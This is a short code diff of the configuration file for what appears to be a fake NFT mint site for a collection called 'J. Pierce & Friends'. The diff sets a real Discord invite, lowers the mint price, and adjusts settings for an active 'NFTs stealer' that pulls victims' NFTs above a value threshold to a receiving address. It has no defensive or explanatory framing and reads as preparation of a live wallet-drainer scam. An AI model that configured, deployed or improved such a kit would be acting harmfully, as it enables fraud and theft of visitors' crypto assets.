@@ -8,7 +8,7 @@ const collectionInfo = {
     title: "J. Pierce & Friends", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "25.06.2022",
     socialMedia: {
-        discord: "https://discord.gg/example",
+        discord: "https://discord.com/invite/h5rex3zxmf",
         twitter: "https://twitter.com/example",
     },
     medias: {
@@ -23,7 +23,7 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.2,         // Price per NFT.
+    price: 0.08,         // Price per NFT.
     totalSupply: 10000,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
@@ -32,7 +32,7 @@ const mintInfo = {
 
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.08,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
 }
